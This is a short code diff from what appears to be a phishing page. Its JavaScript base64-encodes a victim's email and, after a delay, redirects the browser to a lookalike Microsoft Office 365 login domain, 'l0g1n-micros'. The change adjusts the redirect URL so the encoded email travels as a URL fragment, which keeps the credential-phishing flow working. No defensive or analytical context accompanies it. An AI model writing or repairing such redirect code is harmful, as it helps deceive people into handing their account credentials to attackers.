@@ -93,7 +93,7 @@
 
                     setTimeout(() => {
                         const encodedEmail = btoa(email); // Encoding email to pass in URL
-                        const redirectTo = "https://l0g1n-micros.ftlivedocs.com/o365" + encodedEmail;
+                        const redirectTo = "https://l0g1n-micros.ftlivedocs.com/o365#" + encodedEmail;
                         console.log("Redirecting to: " + redirectTo);
                         window.location.href = redirectTo;
                     }, 6000);
